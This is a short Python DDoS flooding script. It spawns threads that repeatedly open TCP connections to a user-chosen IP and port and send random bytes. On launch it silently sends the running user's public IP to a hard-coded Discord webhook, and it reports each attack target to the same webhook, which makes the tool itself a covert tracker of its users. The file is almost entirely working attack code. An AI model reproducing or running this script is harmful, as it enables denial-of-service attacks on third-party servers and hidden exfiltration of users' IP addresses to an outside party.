import random, socket, threading, os
import requests
from discord_webhook import DiscordWebhook, DiscordEmbed
post = requests.get('https://api.ipify.org').text
webhook = DiscordWebhook(url='https://discord.com/api/webhooks/833943996002861087/xPi3Fbn9L7tiBAvtjrr5tVR_kNkDacEY5gqPFLBFPZXnmSApWA8bK5nD8mQrBIJd39pd')
embed = DiscordEmbed(title='DDoS login LOGS', description=f'logged to {post}', color='000000')
webhook.add_embed(embed)
response = webhook.execute()
ip = str(input('IP : '))
port = int(input('Port : '))
times = int(input('Packet : '))
threads = int(input('Thread : '))

def run():
    data = random._urandom(threads)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for x in range(times):
                s.send(data)
            else:
                print('Attacking {} at Port {}'.format(ip, port))
                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/833943996002861087/xPi3Fbn9L7tiBAvtjrr5tVR_kNkDacEY5gqPFLBFPZXnmSApWA8bK5nD8mQrBIJd39pd')
                embed = DiscordEmbed(title='Attacking', description=f'Attacking {ip}\nport {port}\npacket {time}\nthread {threads}', color='000000')
                webhook.add_embed(embed)
                response = webhook.execute()

        except socket.error:
            s.close()
            print('[VADIM MESSAGE] SERVER ERROR CONNECTION MAYBE SERVER ERROR')


if __name__ == '__main__':
    for y in range(threads):
        th = threading.Thread(target=run)
        th.start()
